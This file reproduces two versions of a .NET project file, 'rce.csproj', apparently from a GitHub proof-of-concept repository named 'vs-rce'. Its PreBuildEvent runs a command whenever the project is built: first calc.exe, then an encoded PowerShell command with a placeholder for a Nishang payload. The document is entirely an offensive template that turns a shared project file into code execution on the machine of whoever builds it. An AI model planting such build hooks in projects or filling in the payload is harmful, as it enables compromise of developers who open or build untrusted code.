// https://github.com/CsEnox/vs-rce/tree/main/rce

// rce.csproj

//

//

```
<Project Sdk="Microsoft.NET.Sdk">

  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net6.0</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
    <PreBuildEvent>calc.exe</PreBuildEvent>
  </PropertyGroup>

</Project>
```

```
<Project Sdk="Microsoft.NET.Sdk">

  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net6.0</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
    <PreBuildEvent>powershell.exe -enc __NISHANG_PAYLOAD__></PreBuildEvent>
  </PropertyGroup>

</Project>
```


//

//
